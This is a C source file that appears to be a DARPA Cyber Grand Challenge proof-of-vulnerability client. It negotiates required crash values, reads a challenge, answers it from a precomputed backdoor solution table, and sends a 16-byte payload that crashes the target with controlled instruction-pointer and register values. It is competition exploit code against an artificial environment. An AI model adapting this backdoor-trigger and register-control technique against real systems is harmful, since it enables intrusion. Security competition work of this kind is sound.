#include <libcgc.h>

#include "backdoor_solutions.h"

typedef char int8_t;
typedef unsigned char uint8_t;
typedef short int16_t;
typedef unsigned short uint16_t;
typedef int int32_t;
typedef unsigned int uint32_t;
typedef long long int64_t;
typedef unsigned long long uint64_t;


char* cstr = (char*)"CGC";

void *memcpy(void *dst, const void *src, size_t n) {
   char *d = (char*)dst;
   const char *s = (const char *)src;
   while (n--) {*d++ = *s++;}
   return dst;
}

int strlen(char *s) {
  int len = 0;
  while (s[len]) {
    len++;
  }
  return len;
}

int send_all(int fd, const void *msg, size_t n_bytes)
{
  size_t len = 0;
  size_t tx = 0;
  while(len < n_bytes) {
    if (transmit(fd, (char *)msg + len, n_bytes - len, &tx) != 0) {
      return 1;
    }
    len += tx;
  }
  return 0;
}

void send_str(unsigned char* str,int fd){
  send_all(fd,(unsigned char*)str,strlen((char*)str));
  return;
}

void send_str_nl(unsigned char* str,int fd){
  send_str(str,fd);
  send_all(fd,"\n",fd);
  return;
}

size_t receive_until(int fd, char *dst, char delim, size_t max )
{
    size_t len = 0;
    size_t rx = 0;
    char c = 0;

    while( len < max ) {
        dst[len] = 0x00;

        if ( receive( fd, &c, 1, &rx ) != 0 ) {
            len = 0;
            goto end;
        }

        if ( c == delim ) {
            goto end;
        }
   
        dst[len] = c;
        len++;
    }
end:
    return len;
}

size_t receive_until_str(int fd, char *dst, const char* delim, int delim_length, size_t max )
{
    size_t len = 0;
    size_t rx = 0;
    char c = 0;
    int delim_idx = 0;
    while( len < max ) {
        dst[len] = 0x00;

        if ( receive( fd, &c, 1, &rx ) != 0 ) {
            len = 0;
            goto end;
        }
        if ( c == delim[delim_idx] ) {
            delim_idx += 1;
        }else{
            delim_idx = 0;
            if( c == delim[0] ){
              delim_idx += 1;
            }
        }
        if ( delim_idx == delim_length ){
          goto end;
        }
   
        dst[len] = c;
        len++;
    }
end:
    return len;
}

size_t receive_n( int fd, unsigned char *dst, size_t n_bytes )
{
  size_t len = 0;
  size_t rx = 0;
  while(len < n_bytes) {
    if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
      len = 0;
      break;
    }
    len += rx;
  }

  return len;
}

unsigned int receive_int_nl(){
  unsigned char tmp[9];
  receive_n(0,tmp,9);
  unsigned int result=0;
  int c;

  for(c=0;c<8;c++){
    if (tmp[c] > 47 && tmp[c] < 58)
      result += (tmp[c] - 48);
    else if (tmp[c] > 64 && tmp[c] < 71)
      result += (tmp[c] - 55);
    else if (tmp[c] > 96 && tmp[c] < 103)
      result += (tmp[c] - 87);
    if(c!=8-1){
      result <<= 4;
    }
  }
  return result;
}
void send_int_nl(uint32_t input,int fd){
  unsigned char tmp[9];
  unsigned int nibble;
  tmp[8] = '\x00';
  int c;

  for(c=7;c>=0;c--){
    nibble = input & 0x0000000f;
    if (nibble < 10)
      tmp[c] = nibble+48;
    else
      tmp[c] = nibble+55;;
    input >>= 4;
  }
  send_str_nl(tmp,fd);
}
void send_int_space(uint32_t input,int fd){
  unsigned char tmp[9];
  unsigned int nibble;
  tmp[8] = '\x00';
  int c;

  for(c=7;c>=0;c--){
    nibble = input & 0x0000000f;
    if (nibble < 10)
      tmp[c] = nibble+48;
    else
      tmp[c] = nibble+55;;
    input >>= 4;
  }
  send_str(tmp,fd);
  send_str((unsigned char*)" ",fd);
}

enum register_t
{
    eax = 0,
    ecx = 1,
    edx = 2,
    ebx = 3,
    esp = 4,
    ebp = 5,
    esi = 6,
    edi = 7
};


void *memset(void *dst, int c, unsigned int n) {
   char *d = (char*)dst;
   while (n--) {*d++ = (char)c;}
   return dst;
}

void int_to_str(int num, int base, char *dst) {
  char const digit[] = "0123456789abcdefghijkl";
  char* p = dst;
  if(num < 0){
      *p++ = '-';
      num *= -1;
  }
  int shifter = num;
  do{ //Move to where representation ends
      ++p;
      shifter = shifter/base;
  } while (shifter);
  *p = '\0';
  do{ //Move back, inserting digits as u go
      *--p = digit[num%base];
      num = num/base;
  }while(num);
}

typedef struct type1_vals_ {
   unsigned int ipval;
   unsigned int regval;
} type1_vals;


/*
 * Negotiate a type 1 pov. Caller specifies an ip bit mask, a register bit mask
 * and a general purpose register number (see the list below).
 *
   0 - eax
   1 - ecx
   2 - edx
   3 - ebx
   4 - esp
   5 - ebp
   6 - esi
   7 - edi
 *
 * Returns 0 on success. On success, the t1vals structure holds required IP
 * and register values that must be found when the target CB crashes. At the
 * time of the crash the following must hold:
 *  (crash_eip & ipmask) == t1vals->ipval
 *  (crash_REG & regmask) == t1vals->regval
 */
int type1_negotiate(unsigned int ipmask, unsigned int regmask, unsigned int regnum, type1_vals *t1vals) {
   uint32_t povType = 1;
   if (send_all(3, &povType, sizeof(povType)) ||
       send_all(3, &ipmask, sizeof(ipmask)) ||
       send_all(3, &regmask, sizeof(regmask)) ||
       send_all(3, &regnum, sizeof(regnum))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t1vals, sizeof(type1_vals)) != sizeof(type1_vals)) {
      return -1;
   }
   return 0;
}


// sha1 implementation, copied and pasted inside backdoor.py
/*
//---------------------------------------
// right now, this is compiled to 268 bytes with -Oz

#define K1 0x5A827999
#define K2 0x6ED9EBA1
#define K3 0x8F1BBCDC
#define K4 0xCA62C1D6

__attribute__((fastcall)) int SHA1(int MESSAGE[] )
{
  //__asm("int $3");
  // these arrays are not necessary but used to better highlight dependencies
  int B, C, D, E;
  int A,An;
  int K;
  int W[80];
  int FN;
  int i;

  A = 0x67452301;
  B = 0x98BADCFE;
  C = 0xEFCDAB89;
  D = 0x10325476;
  E = 0xC3D2E1F0;

  for ( i=0; i<80; ++i ){
    if ( i < 16 ){
      // reverse the order of bytes on little-endian
      W[i] = MESSAGE[i];
    }else{
      W[i] = ROTATE_LEFT( W[i-3] ^ W[i-8] ^ W[i-14] ^ W[i-16], 1 );
    }


    if(i<20){
      K = K1;
      FN = (D ^ ( B & (C ^ D)));
    }else if(i<40){
      K = K2;
      FN =  (D ^ B ^ C);
    }else if(i<60){
      K = K3;
      FN = (B & C) | (D & (B ^ C));
    }else{
      K = K4;
      FN = (D ^ B ^ C);
    }

    An = FN + E + ROTATE_LEFT( A, 5 ) + W[i] + K;

    E = D;
    D = C;
    C = ROTATE_LEFT( B, 30 );
    B = A;
    A = An;

  }

  return (0x67452301 + A);
}

//TODO it seems this is not used by final compiled code (but it is still present in the compiled code)
// find a way to tell clang to remove it
int ROTATE_LEFT(const int value, int shift) {
    unsigned int uvalue = (unsigned int)value;
    return (uvalue << shift) | (uvalue >> (32- shift));
}
//-----------------------
*/

/*
uint32_t sha1block(uint8_t input[5]){
  uint32_t* addr;
  uint32_t res;

  allocate(0x1000, 0, (void*) &addr);
  addr[0] = input[0]<<24|input[1]<<16|input[2]<<8|input[3];
  addr[1] = input[4]<<24;
  res = SHA1((int*)addr);
  return res;
}
*/


void sleep(int secs, int usecs) {
    struct timeval tv;
    tv.tv_sec = secs;
    tv.tv_usec = usecs;
    fdwait(0, NULL, NULL, &tv, NULL);
}

int main() {
  uint32_t challenge;
  unsigned char* res;
  char response[16];
  unsigned int len;
  char big_buffer[100000];

  type1_vals negotiated_vals;
  if(type1_negotiate(0x000fffff,0x000fffff,3,&negotiated_vals)){
    return 1;
  }
  //hope that this gets not fragmented
  if(send_all(1,"\x33\x67\xb1\x80",4)){
    return 1;
  }
  sleep(1,0); //wait a superstitious second
  // send_all(2,(void*)"111\n",4);
  len = receive_until_str(0,big_buffer,"\x04\xd0\xcc\xba",4,100000);
  // send_all(2,(void*)("---------------\n"),16);
  // send_all(2,(void*)"333\n",4);
  // send_all(2,(void*)(&big_buffer[len-4-4+1]),4);
  // send_all(2,(void*)"444\n",4);
  memcpy((void*) (&challenge), (void *)(&(big_buffer[len-4-4+1])),4);
  // send_int_nl(len,2);
  // send_int_nl(challenge,2);
  // send_all(2,(void*)("---------------\n"),16);
  // this is crashing if we receive a wrong challenge, we do not care
  res = &(backdoor_solutions[challenge*5]);
  // endianness is crazy
  response[0] = res[3];
  response[1] = res[2]; 
  response[2] = res[1];
  response[3] = res[0]; 
  response[4] = 0; 
  response[5] = 0;
  response[6] = 0;
  response[7] = res[4];
  // we go just after the flag page, likely to be unmapped
  // the point is that we do not want to jmp to executable memory
  negotiated_vals.ipval = 0x44000000 | (negotiated_vals.ipval & 0x00ffffff);
  memcpy((void*) (&(response[8])), (void *)(&(negotiated_vals.regval)),4);
  memcpy((void*) (&(response[12])), (void *)(&(negotiated_vals.ipval)),4);
  send_all(1,(void*)(response),16);
  return 0;
}


